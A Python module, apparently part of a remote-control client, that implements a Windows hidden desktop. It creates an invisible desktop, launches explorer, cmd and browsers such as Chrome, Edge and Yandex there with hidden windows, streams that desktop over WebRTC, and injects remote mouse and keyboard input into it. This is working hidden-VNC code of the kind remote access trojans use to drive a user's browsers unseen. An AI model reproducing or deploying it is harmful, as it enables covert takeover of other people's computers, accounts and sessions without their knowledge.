"""Hidden desktop helpers for Windows manage sessions."""
from __future__ import annotations

import asyncio
import ctypes
import logging
import os
import platform
import queue
import shutil
import subprocess
import threading
import time
import uuid
from fractions import Fraction
from typing import Iterable

from aiortc import MediaStreamTrack
from aiortc.mediastreams import MediaStreamError, VIDEO_CLOCK_RATE, VIDEO_TIME_BASE
from av.video.frame import VideoFrame

from remote_client.control.input_controller import (
    _SendInputFallback,
    ControlCommand,
    MouseClick,
    MouseDown,
    MouseMove,
    MouseScroll,
    MouseUp,
    KeyDown,
    KeyPress,
    KeyUp,
    TextInput,
)
from remote_client.media.stream_profiles import AdaptiveStreamProfile

logger = logging.getLogger(__name__)

if platform.system() == "Windows":
    from ctypes import wintypes

    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32

    DESKTOP_READOBJECTS = 0x0001
    DESKTOP_CREATEWINDOW = 0x0002
    DESKTOP_CREATEMENU = 0x0004
    DESKTOP_HOOKCONTROL = 0x0008
    DESKTOP_JOURNALRECORD = 0x0010
    DESKTOP_JOURNALPLAYBACK = 0x0020
    DESKTOP_ENUMERATE = 0x0040
    DESKTOP_WRITEOBJECTS = 0x0080
    DESKTOP_SWITCHDESKTOP = 0x0100
    DESKTOP_ACCESS = (
        DESKTOP_READOBJECTS
        | DESKTOP_CREATEWINDOW
        | DESKTOP_CREATEMENU
        | DESKTOP_ENUMERATE
        | DESKTOP_WRITEOBJECTS
        | DESKTOP_SWITCHDESKTOP
    )

    SRCCOPY = 0x00CC0020
    DIB_RGB_COLORS = 0
    BI_RGB = 0

    class BITMAPINFOHEADER(ctypes.Structure):
        _fields_ = [
            ("biSize", wintypes.DWORD),
            ("biWidth", wintypes.LONG),
            ("biHeight", wintypes.LONG),
            ("biPlanes", wintypes.WORD),
            ("biBitCount", wintypes.WORD),
            ("biCompression", wintypes.DWORD),
            ("biSizeImage", wintypes.DWORD),
            ("biXPelsPerMeter", wintypes.LONG),
            ("biYPelsPerMeter", wintypes.LONG),
            ("biClrUsed", wintypes.DWORD),
            ("biClrImportant", wintypes.DWORD),
        ]

    class BITMAPINFO(ctypes.Structure):
        _fields_ = [("bmiHeader", BITMAPINFOHEADER), ("bmiColors", wintypes.DWORD * 3)]

    class RECT(ctypes.Structure):
        _fields_ = [
            ("left", wintypes.LONG),
            ("top", wintypes.LONG),
            ("right", wintypes.LONG),
            ("bottom", wintypes.LONG),
        ]

    user32.CreateDesktopW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        wintypes.LPVOID,
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.LPVOID,
    ]
    user32.CreateDesktopW.restype = wintypes.HANDLE
    user32.CloseDesktop.argtypes = [wintypes.HANDLE]
    user32.CloseDesktop.restype = wintypes.BOOL
    user32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
    user32.SetThreadDesktop.restype = wintypes.BOOL
    user32.GetDesktopWindow.argtypes = []
    user32.GetDesktopWindow.restype = wintypes.HWND
    user32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(RECT)]
    user32.GetWindowRect.restype = wintypes.BOOL
    user32.GetWindowDC.argtypes = [wintypes.HWND]
    user32.GetWindowDC.restype = wintypes.HDC
    user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
    user32.ReleaseDC.restype = wintypes.INT

    gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
    gdi32.CreateCompatibleDC.restype = wintypes.HDC
    gdi32.DeleteDC.argtypes = [wintypes.HDC]
    gdi32.DeleteDC.restype = wintypes.BOOL
    gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, wintypes.INT, wintypes.INT]
    gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
    gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
    gdi32.SelectObject.restype = wintypes.HGDIOBJ
    gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
    gdi32.DeleteObject.restype = wintypes.BOOL
    gdi32.BitBlt.argtypes = [
        wintypes.HDC,
        wintypes.INT,
        wintypes.INT,
        wintypes.INT,
        wintypes.INT,
        wintypes.HDC,
        wintypes.INT,
        wintypes.INT,
        wintypes.DWORD,
    ]
    gdi32.BitBlt.restype = wintypes.BOOL
    gdi32.GetDIBits.argtypes = [
        wintypes.HDC,
        wintypes.HBITMAP,
        wintypes.UINT,
        wintypes.UINT,
        wintypes.LPVOID,
        ctypes.POINTER(BITMAPINFO),
        wintypes.UINT,
    ]
    gdi32.GetDIBits.restype = wintypes.INT


def _resolve_app_executable(app_name: str) -> str | None:
    if not app_name:
        return None
    candidates: Iterable[str]
    name = app_name.strip().lower()
    if name in {"chrome", "google chrome"}:
        candidates = [
            "chrome.exe",
            os.path.join(os.getenv("PROGRAMFILES", ""), "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "Application", "chrome.exe"),
        ]
    elif name in {"brave", "brave browser"}:
        candidates = [
            "brave.exe",
            os.path.join(os.getenv("PROGRAMFILES", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
            os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
        ]
    elif name in {"opera"}:
        candidates = [
            "launcher.exe",
            os.path.join(os.getenv("PROGRAMFILES", ""), "Opera", "launcher.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Opera", "launcher.exe"),
            os.path.join(os.getenv("LOCALAPPDATA", ""), "Programs", "Opera", "launcher.exe"),
        ]
    elif name in {"firefox", "mozilla firefox"}:
        candidates = [
            "firefox.exe",
            os.path.join(os.getenv("PROGRAMFILES", ""), "Mozilla Firefox", "firefox.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Mozilla Firefox", "firefox.exe"),
        ]
    elif name in {"edge", "microsoft edge"}:
        candidates = [
            "msedge.exe",
            os.path.join(os.getenv("PROGRAMFILES", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
            os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
        ]
    elif name in {"yandex", "yandex browser"}:
        candidates = [
            "browser.exe",
            os.path.join(os.getenv("LOCALAPPDATA", ""), "Yandex", "YandexBrowser", "Application", "browser.exe"),
            os.path.join(os.getenv("PROGRAMFILES", ""), "Yandex", "YandexBrowser", "Application", "browser.exe"),
            os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Yandex", "YandexBrowser", "Application", "browser.exe"),
        ]
    else:
        candidates = [app_name]

    for candidate in candidates:
        if not candidate:
            continue
        if os.path.isabs(candidate) and os.path.isfile(candidate):
            return candidate
        resolved = shutil.which(candidate)
        if resolved:
            return resolved
    return None


def _create_desktop(name: str):
    if platform.system() != "Windows":
        raise RuntimeError("Hidden desktop is only supported on Windows.")
    handle = user32.CreateDesktopW(name, None, None, 0, DESKTOP_ACCESS, None)
    if not handle:
        raise ctypes.WinError()
    return handle


def _close_desktop(handle) -> None:
    if not handle:
        return
    try:
        user32.CloseDesktop(handle)
    except Exception:
        return


def _set_thread_desktop(handle) -> bool:
    if not handle:
        return False
    if not user32.SetThreadDesktop(handle):
        logger.warning("SetThreadDesktop failed: %s", ctypes.WinError())
        return False
    return True


class HiddenDesktopCapture:
    def __init__(self, desktop_handle, draw_cursor: bool = False, fps: int = 30) -> None:
        self._desktop_handle = desktop_handle
        self._draw_cursor = bool(draw_cursor)
        self._interval_lock = threading.Lock()
        self._interval = 1.0 / max(1, fps)
        self._stop_event = threading.Event()
        self._frame_lock = threading.Lock()
        self._frame: bytes | None = None
        self._frame_size = (0, 0)
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    @property
    def frame_size(self) -> tuple[int, int]:
        return self._frame_size

    def set_fps(self, fps: int) -> None:
        with self._interval_lock:
            self._interval = 1.0 / max(1, int(fps))

    def set_draw_cursor(self, enabled: bool) -> None:
        self._draw_cursor = bool(enabled)

    def get_frame(self, timeout: float = 0.6) -> tuple[bytes | None, tuple[int, int]]:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._frame_lock:
                if self._frame is not None:
                    return self._frame, self._frame_size
            time.sleep(0.01)
        return None, self._frame_size

    def close(self) -> None:
        self._stop_event.set()
        if self._thread.is_alive():
            self._thread.join(timeout=1.5)

    def _capture(self, srcdc, memdc, bmp, width: int, height: int) -> bytes | None:
        if not gdi32.BitBlt(memdc, 0, 0, width, height, srcdc, 0, 0, SRCCOPY):
            return None
        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = width
        bmi.bmiHeader.biHeight = -height
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 32
        bmi.bmiHeader.biCompression = BI_RGB
        buffer = ctypes.create_string_buffer(width * height * 4)
        lines = gdi32.GetDIBits(memdc, bmp, 0, height, buffer, ctypes.byref(bmi), DIB_RGB_COLORS)
        if lines == 0:
            return None
        return buffer.raw

    def _run(self) -> None:
        if not _set_thread_desktop(self._desktop_handle):
            return
        hwnd = user32.GetDesktopWindow()
        rect = RECT()
        if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
            logger.warning("Hidden desktop: failed to get desktop rect.")
            return
        width = max(1, rect.right - rect.left)
        height = max(1, rect.bottom - rect.top)
        self._frame_size = (width, height)

        hwindc = user32.GetWindowDC(hwnd)
        if not hwindc:
            logger.warning("Hidden desktop: failed to get window DC.")
            return
        memdc = gdi32.CreateCompatibleDC(hwindc)
        bmp = gdi32.CreateCompatibleBitmap(hwindc, width, height)
        if not memdc or not bmp:
            logger.warning("Hidden desktop: failed to create capture DC/bitmap.")
            if memdc:
                gdi32.DeleteDC(memdc)
            user32.ReleaseDC(hwnd, hwindc)
            return
        old = gdi32.SelectObject(memdc, bmp)

        try:
            while not self._stop_event.is_set():
                start = time.monotonic()
                data = self._capture(hwindc, memdc, bmp, width, height)
                if data:
                    with self._frame_lock:
                        self._frame = data
                with self._interval_lock:
                    interval = self._interval
                elapsed = time.monotonic() - start
                sleep_for = max(0.0, interval - elapsed)
                if sleep_for:
                    self._stop_event.wait(sleep_for)
        finally:
            gdi32.SelectObject(memdc, old)
            gdi32.DeleteObject(bmp)
            gdi32.DeleteDC(memdc)
            user32.ReleaseDC(hwnd, hwindc)


class HiddenDesktopTrack(MediaStreamTrack):
    kind = "video"

    def __init__(self, capture: HiddenDesktopCapture, profile: str = "balanced") -> None:
        super().__init__()
        self._capture = capture
        native_size = capture.frame_size
        if native_size == (0, 0):
            native_size = (1280, 720)
        self._profile = AdaptiveStreamProfile(native_size, profile=profile)
        self._target_size = self._profile.target_size
        self._target_fps = self._profile.target_fps
        self._timestamp = 0
        self._start: float | None = None
        self._last_frame_ts: float | None = None

    def set_profile(
        self,
        profile: str | None,
        width: int | None,
        height: int | None,
        fps: int | None,
    ) -> None:
        self._profile.apply_profile(profile, width, height, fps)
        self._target_size = self._profile.target_size
        self._target_fps = self._profile.target_fps
        if fps:
            self._capture.set_fps(fps)

    def set_draw_cursor(self, enabled: bool) -> None:
        self._capture.set_draw_cursor(enabled)

    async def _next_timestamp(self) -> tuple[int, Fraction]:
        if self.readyState != "live":
            raise MediaStreamError
        if self._start is None:
            self._start = time.time()
            self._timestamp = 0
            return self._timestamp, VIDEO_TIME_BASE
        fps = self._target_fps if self._target_fps > 0 else 30
        increment = int(VIDEO_CLOCK_RATE / fps)
        self._timestamp += increment
        wait = self._start + (self._timestamp / VIDEO_CLOCK_RATE) - time.time()
        if wait > 0:
            await asyncio.sleep(wait)
        return self._timestamp, VIDEO_TIME_BASE

    async def recv(self) -> VideoFrame:
        pts, time_base = await self._next_timestamp()
        start = time.monotonic()
        data, size = self._capture.get_frame()
        width, height = size
        if not data or width <= 0 or height <= 0:
            frame = VideoFrame(width=self._target_size[0], height=self._target_size[1], format="bgr24")
            for plane in frame.planes:
                plane.update(bytes(plane.buffer_size))
        else:
            frame = VideoFrame(width=width, height=height, format="bgra")
            frame.planes[0].update(data)
            if self._target_size and (width, height) != self._target_size:
                frame = frame.reformat(width=self._target_size[0], height=self._target_size[1])
        now = time.monotonic()
        if self._last_frame_ts is not None:
            self._profile.add_fps_sample(now - self._last_frame_ts)
        self._last_frame_ts = now
        if self._profile.maybe_adjust(now - start, now=now):
            self._target_size = self._profile.target_size
            self._target_fps = self._profile.target_fps
        frame.pts = pts
        frame.time_base = time_base
        return frame

    def stop(self) -> None:
        self._capture.close()
        super().stop()


class HiddenDesktopInputController:
    def __init__(self, desktop_handle, screen_size: tuple[int, int]) -> None:
        self._desktop_handle = desktop_handle
        self._screen_size = screen_size
        self._queue: queue.Queue[ControlCommand] = queue.Queue()
        self._stop_event = threading.Event()
        self._fallback = _SendInputFallback()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def set_screen_size(self, size: tuple[int, int]) -> None:
        self._screen_size = size

    def execute(self, command: ControlCommand) -> None:
        if not self._stop_event.is_set():
            self._queue.put(command)

    def close(self) -> None:
        self._stop_event.set()
        if self._thread.is_alive():
            self._thread.join(timeout=1.0)

    @staticmethod
    def _normalize_scroll_delta(value: int | None) -> int:
        if value is None:
            return 0
        try:
            delta = int(value)
        except (TypeError, ValueError):
            return 0
        if delta == 0:
            return 0
        step = int(round(delta / 120))
        if step == 0:
            step = 1 if delta > 0 else -1
        return step

    def _scale_coordinates(
        self,
        x: int,
        y: int,
        source_width: int | None,
        source_height: int | None,
    ) -> tuple[int, int]:
        if not source_width or not source_height:
            return x, y
        screen_width, screen_height = self._screen_size
        if screen_width <= 0 or screen_height <= 0:
            return x, y
        scaled_x = int(round(x * screen_width / source_width))
        scaled_y = int(round(y * screen_height / source_height))
        scaled_x = max(0, min(screen_width - 1, scaled_x))
        scaled_y = max(0, min(screen_height - 1, scaled_y))
        return scaled_x, scaled_y

    def _execute_command(self, command: ControlCommand) -> None:
        screen_width, screen_height = self._screen_size
        if isinstance(command, MouseMove):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.move(x, y, screen_width, screen_height)
        elif isinstance(command, MouseClick):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.click(command.button, screen_width, screen_height, x, y)
        elif isinstance(command, MouseDown):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.mouse_down(command.button, screen_width, screen_height, x, y)
        elif isinstance(command, MouseUp):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.mouse_up(command.button, screen_width, screen_height, x, y)
        elif isinstance(command, MouseScroll):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            delta_x = self._normalize_scroll_delta(command.delta_x)
            delta_y = -self._normalize_scroll_delta(command.delta_y)
            if delta_x or delta_y:
                self._fallback.scroll(delta_x, delta_y, screen_width, screen_height, x, y)
        elif isinstance(command, KeyPress):
            self._fallback.keypress(command.key)
        elif isinstance(command, KeyDown):
            self._fallback.key_down(command.key)
        elif isinstance(command, KeyUp):
            self._fallback.key_up(command.key)
        elif isinstance(command, TextInput):
            if command.text:
                self._fallback.text(command.text)

    def _run(self) -> None:
        if not _set_thread_desktop(self._desktop_handle):
            return
        while not self._stop_event.is_set():
            try:
                command = self._queue.get(timeout=0.2)
            except queue.Empty:
                continue
            try:
                self._execute_command(command)
            except Exception:
                logger.exception("Hidden desktop input failed.")


class HiddenDesktopSession:
    def __init__(self) -> None:
        if platform.system() != "Windows":
            raise RuntimeError("Hidden desktop is only supported on Windows.")
        self._desktop_name = f"rc_hidden_{uuid.uuid4().hex}"
        self._desktop_handle = _create_desktop(self._desktop_name)
        self._desktop_path = f"WinSta0\\{self._desktop_name}"
        self._processes: list[subprocess.Popen] = []
        self._start_shell()

        self._capture = HiddenDesktopCapture(self._desktop_handle, draw_cursor=False, fps=30)
        size = self._capture.frame_size
        deadline = time.monotonic() + 1.0
        while size == (0, 0) and time.monotonic() < deadline:
            time.sleep(0.05)
            size = self._capture.frame_size
        self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
        self.input_controller = HiddenDesktopInputController(self._desktop_handle, size)

    def _start_shell(self) -> None:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        for cmd in ("explorer.exe", "cmd.exe"):
            try:
                proc = subprocess.Popen([cmd], startupinfo=startupinfo)
                self._processes.append(proc)
            except Exception as exc:
                logger.warning("Failed to start %s on hidden desktop: %s", cmd, exc)

    def launch_application(self, app_name: str) -> None:
        exe = _resolve_app_executable(app_name)
        if not exe:
            raise FileNotFoundError(app_name)
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        proc = subprocess.Popen([exe], startupinfo=startupinfo)
        self._processes.append(proc)

    def close(self) -> None:
        self.screen_track.stop()
        self.input_controller.close()
        for proc in self._processes:
            try:
                proc.terminate()
            except Exception:
                pass
        self._processes.clear()
        _close_desktop(self._desktop_handle)
        self._desktop_handle = None
